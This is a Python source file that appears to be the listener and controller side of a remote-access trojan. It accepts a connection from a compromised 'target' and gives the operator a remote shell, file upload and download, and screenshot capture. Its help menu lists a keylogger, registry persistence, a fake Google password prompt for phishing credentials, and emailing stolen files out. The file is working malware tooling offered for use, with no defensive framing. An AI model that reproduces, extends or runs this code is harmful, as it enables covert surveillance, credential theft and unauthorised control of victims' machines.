import socket
import termcolor
import json
import os


ipKali = '172.25.136.45'
port = 6969

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(filename):
    print('Start Uploading...')
    f = open(filename, 'rb')
    target.send(f.read())
    print(termcolor.colored('The Files Has Uploaded Successfuly\n', 'green'))

def download_file(filename):
    print('start downloading...')
    f = open(filename, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()
    print(termcolor.colored('The File has Downloaded Successfuly\n', 'green'))

def target_communication():
    count = 0
    while True:
        #reliable_send('pwd')
        #reliable_send('cd')
        #pathPwd = str(reliable_recv())
        command = input(termcolor.colored('* Shell~%s\n>>>>>>   ' % str(ip), 'blue'))
        reliable_send(command)
        if command.lower() == 'quit' or command.lower() == 'exit':
            print('quiting...')
            break
        elif command.lower() == 'clear':
            os.system('clear')
        elif command.lower()[:3] == 'cd ':
            print(termcolor.colored('Entered Directory Successfuly\n', 'blue'))
        elif command.lower()[:6] == 'upload':
            upload_file(command[7:])
        elif command.lower()[:8] == 'download':
            download_file(command[9:])
        elif command.lower() == 'screen shot' or command.lower() == 'ss':
            print('Getting Screenshot...')
            f = open("screenshots/screen_shot%d.png" % count, 'wb')
            target.settimeout(3)
            chunk = target.recv(1024)
            while chunk:
                f.write(chunk)
                try:
                    chunk = target.recv(1024)
                except socket.timeout as e:
                    break
            target.settimeout(None)
            f.close()
            print(termcolor.colored('Screenshot Saved Successfuly\n', 'green'))

            count += 1
        elif command.lower() == 'help':
            print(termcolor.colored('''\ncommands:
            quit / exit                         -->            Quit Session With The Target
            clear                               -->            Clear The Screen
            cd *Directory Name*                 -->            Change Directory To Target System
            upload *file Name*                  -->            Upload File To The Target Machine
            download *file Name*                -->            Download File From The Target Machine
            keylog start / kl start             -->            Start The KeyLogger
            keylog dump / kl dump               -->            Print Keystroke That Target Inputted
            keylog stop / kl stop               -->            Stop And Seilf Destruct KeyLogger File
            persistence *RegName* *fileName*    -->            Create Persistence In Registry
            persis *RegName* *fileName*          -->            Create Persistence In Registry
            google ver                           -->            Open Monogame That Ask For Password For Google Account
            sm *fileName* *Mail Address*        -->            Send The file To The main Adress''', 'green'))
        else:
            result = reliable_recv()
            print(result)
    print(termcolor.colored('bye bye ..... :-(\n', 'red'))


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((ipKali, port))
print(termcolor.colored('[+] Listening For The Incoming Connections', 'yellow'))
sock.listen(5)
target, ip = sock.accept()
print(termcolor.colored('[+] Target Connected From:\t' + str(ip), 'green'))
target_communication()
sock.close()

